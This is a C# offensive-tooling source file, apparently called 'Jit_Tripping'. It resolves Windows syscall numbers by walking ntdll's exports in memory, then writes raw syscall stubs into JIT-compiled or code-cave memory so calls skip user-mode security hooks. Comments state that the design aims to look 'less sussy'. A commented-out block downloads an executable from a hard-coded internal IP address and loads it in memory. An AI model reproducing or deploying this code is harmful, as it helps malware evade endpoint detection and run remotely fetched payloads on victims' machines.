using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Reflection;
using System.Threading;
using System.Net;
namespace Jit_Tripping
{
    class ntdll
    {
        public IntPtr dllLocation;
        int exportRva;
        int ordinalBase;
        int numberOfNames;
        int functionsRva;
        int namesRva;
        int ordinalsRva;

        public Dictionary<int, needName> dictOfNtFunctionsNamesAndAddresses = new Dictionary<int, needName>();
        public Dictionary<int, needName> dictOfNtFunctionsNamesAndAddressesOrdered = new Dictionary<int, needName>();
        IntPtr[] ntFunctionAddressesLowestToHighest;
        IntPtr codeCove; //Either the machine code of the JITTED method, OR code cave in the middle if the former doesn't work
        bool anotherMethod = false; //Instead of hijacking the post JIT machine code, lets get that weird code cave in the middle 

        public struct needName //This struct needs a name LMAO
        {
            public string funcName;
            public IntPtr funcAddr;
        }
        public ntdll()
        {
            
            if (IntPtr.Size != 8)
            {
                Console.WriteLine("[!] This only works for x64!");
                Environment.Exit(0);
            }
            
            //Find ntdll in memory
            Process current = Process.GetCurrentProcess();
            this.dllLocation = IntPtr.Zero;
            foreach (ProcessModule p in current.Modules)
            {
                if (p.ModuleName.ToLower() == "ntdll.dll")
                {
                    this.dllLocation = p.BaseAddress;
                    break;
                }
            }
            if (this.dllLocation == IntPtr.Zero)
            {
                Console.WriteLine("[!] No shot ntdll isnt loaded YO WHAT");
                return;
            }
            //Dinvoke magic to parse some very important properties
            var peHeader = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + 0x3C));
            var optHeader = this.dllLocation.ToInt64() + peHeader + 0x18;
            var magic = Marshal.ReadInt16((IntPtr)optHeader);
            long pExport = 0;
            if (magic == 0x010b) pExport = optHeader + 0x60;
            else pExport = optHeader + 0x70;
            this.exportRva = Marshal.ReadInt32((IntPtr)pExport);
            this.ordinalBase = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + exportRva + 0x10));
            this.numberOfNames = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + exportRva + 0x18));
            this.functionsRva = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + exportRva + 0x1C));
            this.namesRva = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + exportRva + 0x20));
            this.ordinalsRva = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + exportRva + 0x24));

            getSyscallIds();
            GenerateRWXMemorySegment();
        }

        /// <summary>
        /// Using ElephantSe4l method and my terrible compsci sorting abilities, find the syscall ID via the order of the functions in memory
        /// </summary>
        public void getSyscallIds()
        {
            IntPtr functionPtr = IntPtr.Zero;
            int ntCounter = 0;
            for (var i = 0; i < this.numberOfNames; i++) //Find all the NtFunctions and their memory addresses
            {
                var functionName = Marshal.PtrToStringAnsi((IntPtr)(this.dllLocation.ToInt64() + Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + namesRva + i * 4))));
                if (string.IsNullOrWhiteSpace(functionName)) continue;
                if (functionName.StartsWith("Nt") && !functionName.StartsWith("Ntdll"))
                {
                    var functionOrdinal = Marshal.ReadInt16((IntPtr)(this.dllLocation.ToInt64() + ordinalsRva + i * 2)) + ordinalBase;
                    var functionRva = Marshal.ReadInt32((IntPtr)(this.dllLocation.ToInt64() + functionsRva + 4 * (functionOrdinal - ordinalBase)));
                    functionPtr = (IntPtr)((long)this.dllLocation + functionRva);
                    needName temp = new needName();
                    temp.funcAddr = functionPtr;
                    temp.funcName = functionName;
                    this.dictOfNtFunctionsNamesAndAddresses.Add(ntCounter, temp);
                    ntCounter++;
                }
            }
            //An array of the memory addresses
            ntFunctionAddressesLowestToHighest = new IntPtr[dictOfNtFunctionsNamesAndAddresses.Count];
            for (int j = 0; j < ntFunctionAddressesLowestToHighest.Length; j++)
            {
                ntFunctionAddressesLowestToHighest[j] = this.dictOfNtFunctionsNamesAndAddresses[j].funcAddr;
            }
            //Sort it, lowest to highest
            for (int k = 0; k < ntFunctionAddressesLowestToHighest.Length - 1; k++)
            {
                if ((long)ntFunctionAddressesLowestToHighest[k] > (long)ntFunctionAddressesLowestToHighest[k + 1])
                {
                    var temp = ntFunctionAddressesLowestToHighest[k];
                    ntFunctionAddressesLowestToHighest[k] = ntFunctionAddressesLowestToHighest[k + 1];
                    ntFunctionAddressesLowestToHighest[k + 1] = temp;
                    k = -1;
                }
            }
            int z = 0;
            //Compare the array to the dictionary so we can make the dictionary ordered
            foreach (var item in ntFunctionAddressesLowestToHighest)
            {
                foreach (var item2 in dictOfNtFunctionsNamesAndAddresses)
                {
                    if ((long)item == (long)item2.Value.funcAddr)
                    {
                        needName temp = new needName();
                        temp.funcAddr = item2.Value.funcAddr;
                        temp.funcName = item2.Value.funcName;
                        dictOfNtFunctionsNamesAndAddressesOrdered.Add(z, temp);

                        break;
                    }
                }
                z++;
            }
        }

        // Sacrificing this method to da gods
        public static UInt32 Gate()
        {
            return new UInt32();
        }
        /// <summary>
        /// Jit the Gate() Method, and try 1. If it doesn't work, do 2.
        /// 1. Find machine code of JITTED method and designate it for our syscall writing
        /// 2. Backtrack the memory page and find that one weird code cave that exists for some reason.
        /// </summary>
        public void GenerateRWXMemorySegment()
        {
            
            // Find and JIT the method?
            MethodInfo method = typeof(ntdll).GetMethod(nameof(Gate), BindingFlags.Static | BindingFlags.Public);
            if (method == null)
            {
                Console.WriteLine("Unable to find the method");
                return;
            }
            RuntimeHelpers.PrepareMethod(method.MethodHandle);

            // Get the address of the function to find JITted machine code or figure out if JIT went weird
            IntPtr pMethod = method.MethodHandle.GetFunctionPointer();
            Console.WriteLine("Managed method address:   0x{0:X}", (long)pMethod);
            if (Marshal.ReadByte(pMethod) != 0xe9)
            {
                Console.WriteLine("Method was not JIT'ed or invalid stub, gonna try another method");
                this.codeCove = pMethod;
                this.anotherMethod = true;
                return;
            }
            Int32 offset = Marshal.ReadInt32(pMethod, 1);
            UInt64 addr64 = 0;
            
            addr64 = (UInt64)pMethod + (UInt64)offset;
            while (addr64 % 16 != 0)
                addr64++;
            Console.WriteLine($"Unmanaged method address: 0x{addr64:x16}\n");
            this.codeCove = (IntPtr)addr64;
        }

        /// <summary>
        /// Jam a syscall into the codecove, make a delegate to it, and invoke. Each syscall overwrites each other, so less sussy?
        /// </summary>
        /// <typeparam name="T">Delegate to be used as function prototype for the syscall</typeparam>
        /// <param name="name">Name of NtFunction who's syscall we're nabbing</param>
        /// <param name="arr">Object arr of args. Each item may get modified depending on if original Nt func passed by ref or not, so initialize accordingly</param>
        /// <returns></returns>
        public object betterSyscallInvoke<T>(string name, object[] arr) where T : Delegate
        {
            if (this.anotherMethod)
            {
                GenerateRWXMemorySegment2();
            }
            short syscallId = -1;
            foreach (var item in this.dictOfNtFunctionsNamesAndAddressesOrdered)
            {
                if (item.Value.funcName == name)
                {
                    syscallId = (short)item.Key;
                }
            }
            if (syscallId == -1)
            {
                Console.WriteLine("Syscallid for {0} not found!", name);
                return null;
            }
            byte[] stub = new byte[24] {
                    0x4c, 0x8b, 0xd1,                                      // mov  r10, rcx
                    0xb8, (byte)syscallId, (byte)(syscallId >> 8), 0x00, 0x00, // mov  eax, <syscall
                    0xf6, 0x04, 0x25, 0x08, 0x03, 0xfe, 0x7f, 0x01,        // test byte ptr [SharedUserData+0x308],1
                    0x75, 0x03,                                            // jne  ntdll!<function>+0x15
                    0x0f, 0x05,                                            // syscall
                    0xc3,                                                  // ret
                    0xcd, 0x2e,                                            // int  2Eh
                    0xc3                                                   // ret
            };

            /* this stub works too and its cool so ima keep it here 
            stub = new byte[11]
            {
                0x4c, 0x8b, 0xd1,
                0xb8, (byte)syscallId, (byte) (syscallId >> 8), 0x00, 0x00,
                0x0f, 0x05,
                0xc3
            };
            */
            Marshal.Copy(stub, 0, this.codeCove, stub.Length);
            var syscall = Marshal.GetDelegateForFunctionPointer(this.codeCove, typeof(T));
            var retValue = syscall.DynamicInvoke(arr);
            return retValue;

        }

        /// <summary>
        /// Backtrack the memory page and find that one weird code cave that exists for some reason.
        /// </summary>
        public void GenerateRWXMemorySegment2()
        {
            int nullbytes = 0;
            int i = 0;
            while (nullbytes < 49) //We don't need this much space but me gusto padding or something like that
            {
                i--;
                byte data = Marshal.ReadByte(IntPtr.Add(this.codeCove, i));
                if (data == 0x00)
                    nullbytes++;
                else
                    nullbytes = 0;
            }
            this.codeCove = IntPtr.Add(this.codeCove, i);
            Console.WriteLine("Code cove: 0x{0:X}", (long)this.codeCove);
            this.anotherMethod = false;
            /* Yet another method: load an assembly and write to its PRE-JIT code? its RWX
            WebClient wc = new WebClient();
            byte[] fbytes = wc.DownloadData("http://172.29.104.228:8000/Inline-Test.exe");
            Assembly a = Assembly.Load(fbytes);

            MethodInfo m = a.EntryPoint;

            Assembly thisAss = Assembly.GetExecutingAssembly();
            foreach (var mod in a.GetLoadedModules())
            {
                Console.WriteLine(mod.Assembly.FullName);
                Console.WriteLine("0x{0:X}", (long)mod.Assembly.EntryPoint.MethodHandle.GetFunctionPointer());
            }
            this.codeCove = a.GetLoadedModules()[0].Assembly.EntryPoint.MethodHandle.GetFunctionPointer();
            */
        }

        //Sanity check
        public void listSyscallNumbers()
        {
            foreach (var item in this.dictOfNtFunctionsNamesAndAddressesOrdered)
            {
                Console.WriteLine("{0}: {1}", item.Key, item.Value.funcName);
            }
        }
    }
}
